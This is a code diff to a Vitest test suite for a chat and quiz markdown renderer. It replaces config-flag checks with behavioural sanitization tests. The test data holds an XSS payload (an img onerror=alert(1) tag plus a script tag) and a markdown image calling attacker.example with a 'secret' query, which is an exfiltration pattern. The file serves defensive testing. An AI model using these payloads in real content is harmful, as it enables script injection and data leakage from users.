@@ -4,9 +4,7 @@ import { describe, expect, it } from "vitest";
 import { withI18n } from "@/__tests__/test-utils/i18n";
 import ChatMarkdown from "@/components/chat/chat-markdown";
 import QuizMarkdown from "@/components/quiz/quiz-markdown";
-import MarkdownRenderer, {
-  markdownRendererVariants,
-} from "@/lib/markdown/renderer";
+import MarkdownRenderer from "@/lib/markdown/renderer";
 
 function renderMarkdown(
   children: string,
@@ -62,16 +60,7 @@ describe("MarkdownRenderer variants", () => {
     expect(html).toContain('href="https://example.com" target="_blank"');
   });
 
-  it("keeps chat and quiz raw HTML disabled and sanitized explicitly", () => {
-    expect(markdownRendererVariants.chat).toMatchObject({
-      allowRawHtml: false,
-      sanitize: true,
-    });
-    expect(markdownRendererVariants.quiz).toMatchObject({
-      allowRawHtml: false,
-      sanitize: true,
-    });
-
+  it("does not render raw HTML from chat or quiz text", () => {
     for (const variant of ["chat", "quiz"] as const) {
       const html = renderMarkdown('<img src="x" onerror="alert(1)"><script>x</script>', variant);
       expect(html).not.toContain("<img");
@@ -86,7 +75,6 @@ describe("MarkdownRenderer variants", () => {
     const sneaky = "![x](//attacker.example/pixel.png)";
 
     for (const variant of ["chat", "quiz"] as const) {
-      expect(markdownRendererVariants[variant].remoteImages).toBe(false);
       const html = renderMarkdown(`${leak}\n\n${sneaky}`, variant);
       expect(html).not.toContain("<img");
       expect(html).toContain('href="https://attacker.example/pixel.png?q=secret"');
